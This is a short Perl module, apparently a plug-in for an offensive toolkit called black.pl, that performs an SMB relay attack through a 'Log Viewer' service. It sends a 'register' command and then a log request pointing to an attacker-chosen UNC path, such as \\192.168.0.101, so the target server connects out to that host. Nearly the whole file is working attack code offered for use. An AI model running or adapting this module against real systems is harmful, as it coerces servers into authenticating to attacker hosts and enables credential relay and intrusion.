#!/usr/bin/perl
# Module SMB relay via Log Viewer

# CONFIG
######################
my $desc ="LogViewer SMB relay \n\t Usage: black.pl .. .. -m id_module <path> \n\t UNC path like this: \\\\192.168.0.101\n\n"; 
our $funcName="LogViewer_SMBrelay_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub LogViewer_SMBrelay_Func()
{
	my @data=('',"register\r\n");
		
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}
	
	push(@data, "$path#TextFormatLog\r\n");
	
	@answers=send_bin(1,0,@data);
	my $answer=join('', @answers);
	
	print $answer;

	print "\n\n";
}